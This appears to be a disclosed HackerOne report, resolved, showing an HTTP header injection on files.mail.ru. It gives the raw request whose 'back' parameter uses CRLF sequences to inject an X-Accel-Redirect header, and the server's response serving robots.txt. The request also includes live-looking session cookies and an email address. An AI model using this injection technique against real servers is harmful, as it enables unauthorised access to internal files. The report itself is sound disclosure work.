---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '20400'
original_report_id: '20400'
title: 'files.mail.ru: HTTP Header Injection'
team_handle: mailru
created_at: '2014-07-17T17:25:42.134Z'
disclosed_at: '2015-09-13T12:08:57.273Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
---

# files.mail.ru: HTTP Header Injection

## Metadata

- HackerOne Report ID: 20400
- Weakness: 
- Program: mailru
- Disclosed At: 2015-09-13T12:08:57.273Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Прокидывается хэдер + работает X-Accel-Redirect

GET /rus?back=%0d%0aX-Accel-Redirect:/robots.txt%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0ayarrrrrrrr HTTP/1.1
Host: files.mail.ru
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://files.mail.ru/226F8BEFF65C4B859CF7AEC3158BB963
Cookie: flsmlrur=b51c5d98b0c259923c8d7e45a58936ad; mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nF:; searchuid=9987040291391447473; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; optimizelySegments=%7B%221363374953%22%3A%22direct%22%2C%221379862954%22%3A%22ff%22%2C%221356673191%22%3A%22false%22%7D; optimizelyEndUserId=oeu1404747734356r0.5230243679244354; optimizelyBuckets=%7B%7D; mc2=parapa.mail.ru; statistics=sub%3Aplay%3Aauditory%3Aauditory_v1%3Atargeting; _ym_visorc_9569476=w; lang=ru; lang_set=1; swa_lang=ru; s=fver=14|geo=2582|georb=70|geol1=188; sdcs=LOE3Wp1PzhC2DY6b; HTML5Uploader=2; gmt=4; ssdc_info=b28b:0:1405443710; ssdc=b28bc8b89eed47a991ab7df94c2f2428; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAID3gcA; agent_family=62; i=AQCj6cdTBwATAAgiC3QAASMBAWQBAY8BARkCAe4CAbkDAdwEAvQEAQAGARonAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAf7vAQgEAQEAAVgDCAQBAQAB; b=iz8dAHDkeAQAjE+WgU90RdgKpwQt+5QAX7QVWDxcgkqYabCGmg7GTdMBPmk6cENNhwAAgPAICjBuZhTGPCjAGAcgEDOZCqEgV2H8zCiISFCAkJpVEoY/A8JEPkIYqGoJLZkKYtpfIVzkI4S/JJJwTtUi8n4LQMgfuCFCbOCGhH2WcCB2CkRFIF+dJIHkr6GMcnG1Eng7UUXg4/IZo+xosoRzKEMSzg+wQjhZKgXBh+4VBAAA; c=RwDIUwAAABotDgATAQAA9AAAAQAA; sdc=2nRTjSeYdCtsBbEH; __utmb=251387409.3.10.1405616364; Mpop=1405616394:79077d5246435c5619050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; __utma=243978240.145097379.1400943163.1405426254.1405426254.1; __utmc=243978240; __utmz=243978240.1405426254.1.1.utmcsr=list.mail.ru|utmccn=(referral)|utmcmd=referral|utmcct=/fast-bin/pregistration.bat; mc1=1405616486





HTTP/1.1 200 OK
Server: nginx
Date: Thu, 17 Jul 2014 17:24:18 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 136
Connection: close
Set-Cookie: 
Set-Cookie: flsmlrur=cb2d737465b163168014e731708ed168; path=/; expires=Sun, 20 Jul 2014 17:24:18 GMT; domain=.files.mail.ru
Cache-Control: must-revalidate, post-check=0, pre-check=0
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Last-Modified: Tue, 03 Apr 2012 11:45:47 GMT
ETag: "106cc0b-88-4f7ae2eb-utf-8"
Accept-Ranges: bytes
Expires: Thu, 01 Jan 1970 00:00:01 GMT

User-agent: *
Allow: /$
Allow: /faq
Allow: /sms-services
Allow: /cgi-bin/files/fagreement
Allow: /send
Disallow: /
Host: files.mail.ru

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
